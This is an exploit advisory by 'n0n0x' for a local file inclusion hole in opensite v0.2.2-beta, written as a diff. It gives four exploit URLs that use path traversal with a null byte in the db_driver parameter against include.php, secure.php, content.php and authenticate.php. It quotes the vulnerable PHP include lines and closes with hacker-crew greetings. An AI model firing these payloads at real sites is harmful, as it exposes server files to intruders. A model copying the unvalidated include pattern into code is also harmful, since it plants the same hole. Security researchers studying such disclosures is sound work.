@@ -1,0 +1,59 @@
+#######################################################
+#opensite-v0.2.2-beta <=== Local File Include vuln
+#######################################################
+#By n0n0x
+#Homepage: http://priasantai.uni.cc/
+#Download script :http://sourceforge.net/projects/contentone/files/openSite/opensite-v0.2.2-beta/opensite-v0.2.2-beta.zip/download
+#######################################################
+=========================================
+xpl : 
+http://site.com/os/upload/src/include.php?db_driver=../../../../../../../../../../LFI%00
+
+<?php
+	session_start();
+	header('Cache-control: private');
+
+	include('variables.php');
+	include('functions.php');
+	include('drivers/'.$db_driver.'.php');
+=========================================
+xpl:
+http://site.com/os/upload/src/secure.php?db_driver=../../../../../../../../../../LFI%00
+
+<?php
+	include('variables.php');
+	include('functions.php');
+	include('drivers/'.$db_driver.'.php');
+=========================================
+xpl:
+http://site.com/os/upload/src/content.php?db_driver=../../../../../../../../../../LFI%00
+
+<?php
+	include('functions.php');
+	include('drivers/'.$db_driver.'.php');
+=========================================
+xpl:
+http://site.com/os/upload/src/authenticate.php?db_driver=../../../../../../../../../../LFI%00
+
+<?php
+	error_reporting('2037');
+
+	$auth = false;
+	$username = $_POST['username'];
+	$password = $_POST['password'];
+
+	if ( isset($username) & isset($password) ) {
+
+		include('variables.php');
+		include('functions.php');
+		include('drivers/'.$db_driver.'.php');
+=========================================
+#######################################################
+#Greetz: all member | manadocoding.org - sekuritiOnline.net
+#
+# friends: angky.tatoki, EA ngel, bL4Ck_3n91n3,  opa, x0r0n, team_elite, thama, s0ny,
+#             devilbat, cr4wl3r, cyberl0g, lumut-, Anti_Hack, DskyMC, mr.c, doniskynet.
+#
+# chats : irc.auzs.net 6667-7000 #kesawan,#exploit-db
+######################################################
+
